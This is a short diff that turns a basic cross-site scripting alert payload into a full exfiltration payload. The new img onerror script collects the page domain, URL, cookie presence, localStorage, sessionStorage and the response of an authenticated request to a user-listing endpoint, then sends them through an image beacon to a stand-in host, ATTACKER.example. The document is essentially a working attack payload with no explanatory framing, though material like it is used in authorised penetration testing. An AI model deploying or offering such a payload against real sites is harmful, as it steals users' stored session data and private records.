@@ -1,1 +1,13 @@
-<img src=x onerror="alert('XSS on '+document.domain)">
+<img src=x onerror="(async()=>{
+  const beacon = (o) => new Image().src = 'https://ATTACKER.example/collect?d=' + encodeURIComponent(JSON.stringify(o));
+  const proof = { origin: document.domain, url: location.href, hasCookie: !!document.cookie };
+  try { proof.localStorage = localStorage; } catch(e){}
+  try { proof.sessionStorage = sessionStorage; } catch(e){}
+  try {
+    const r = await fetch('/Home/GetUsers?query=a', {credentials:'include'});
+    const t = await r.text();
+    proof.getUsers = { status: r.status, body: t };
+  } catch(e){ proof.getUsers = 'err'; }
+  alert('XSS on '+document.domain+'\nsession='+proof.hasCookie+'\nGetUsers='+JSON.stringify(proof.getUsers));
+  beacon(proof);
+})()">
